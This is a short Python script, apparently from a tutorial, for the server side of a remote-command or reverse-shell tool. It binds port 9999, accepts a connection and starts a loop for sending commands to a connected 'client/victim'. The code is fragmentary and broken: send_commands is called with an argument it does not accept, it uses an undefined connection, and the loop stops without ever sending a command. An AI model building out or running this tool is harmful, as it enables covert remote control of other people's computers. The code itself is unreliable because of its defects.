import socket
import sys

# create a socket (connect two computer)


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket creation error:" + str(msg))


# Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port" + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket Binding error " + str(msg) + "\n" + "retrying...")
        bind_socket()


# Establish connection with client (socket must be listening

def socket_accept():
    conn,address = s.accept()
    print("Connection has been establised" + "IP " + address[0] + " port" + str(address[1]))
    send_commands(conn)
    conn.close()

# send commands to client/victim or friend
def send_commands():
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
